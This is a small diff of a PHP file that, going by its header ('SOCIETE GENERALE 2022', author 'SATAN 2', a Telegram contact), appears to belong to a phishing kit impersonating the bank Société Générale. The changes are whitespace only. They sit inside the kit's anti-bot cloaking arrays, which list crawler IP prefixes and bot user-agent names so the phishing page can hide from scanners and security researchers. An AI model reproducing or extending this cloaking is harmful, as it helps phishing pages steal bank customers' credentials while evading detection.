@@ -1,9 +1,9 @@
 <?php
 
 /**
- * @link       :   https://www.satan2.com/ 
- * @package    :   SOCIETE GENERALE 
- * @telegram   :   @satan2  
+ * @link       :   https://www.satan2.com/
+ * @package    :   SOCIETE GENERALE
+ * @telegram   :   @satan2
  * Project Name:   SOCIETE GENERALE 2022
  * Author      :   SATAN 2
  * Mise à jour :   08-09-2022
@@ -80,9 +80,9 @@ $ips = array( /* LIST BOOTS IP */
 		 "^62.90.*.*",
 
 		 "^89.138.*.*",
-	
+
 	     "^207.*.*.*",
-	
+
          "^207.*.*.*",
 
 		 "^82.166.*.*",
@@ -214,7 +214,7 @@ $Botname = array( /* LIST BOOTS NAME */
 		 "Trident",
 
 		 "X11",
-		 
+
 
 
 		 "crawler",
